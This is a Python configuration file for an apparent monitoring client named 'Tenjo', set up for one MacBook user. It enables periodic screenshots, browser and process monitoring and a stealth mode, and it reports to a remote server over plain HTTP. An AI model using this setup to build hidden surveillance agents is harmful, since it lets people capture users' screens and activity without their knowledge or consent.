# Tenjo Client Configuration for Yayasans-MacBook-Air.local
import os
from datetime import datetime

class Config:
    # Server Configuration
    SERVER_URL = "http://103.129.149.67"
    API_ENDPOINT = f"{SERVER_URL}/api"

    # Client Identification
    CLIENT_ID = "5fd85b0a-def8-432c-b10a-0a28c22f5baf"  # From database registration
    CLIENT_NAME = "Yayasans-MacBook-Air.local"
    CLIENT_USER = "yapi"

    # Monitoring Settings
    SCREENSHOT_INTERVAL = 60  # seconds
    BROWSER_CHECK_INTERVAL = 30  # seconds
    PROCESS_CHECK_INTERVAL = 45  # seconds

    # Features
    SCREENSHOT_ENABLED = True
    BROWSER_MONITORING = True
    PROCESS_MONITORING = True
    STEALTH_MODE = True

    # Paths
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    DATA_DIR = os.path.join(BASE_DIR, "data")

    # Logging
    LOG_LEVEL = "INFO"
    LOG_FILE = os.path.join(LOG_DIR, f"tenjo_client_{datetime.now().strftime('%Y%m%d')}.log")

    @classmethod
    def init_directories(cls):
        """Create directories if they don't exist"""
        os.makedirs(cls.LOG_DIR, exist_ok=True)
        os.makedirs(cls.DATA_DIR, exist_ok=True)

# Initialize directories
Config.init_directories()
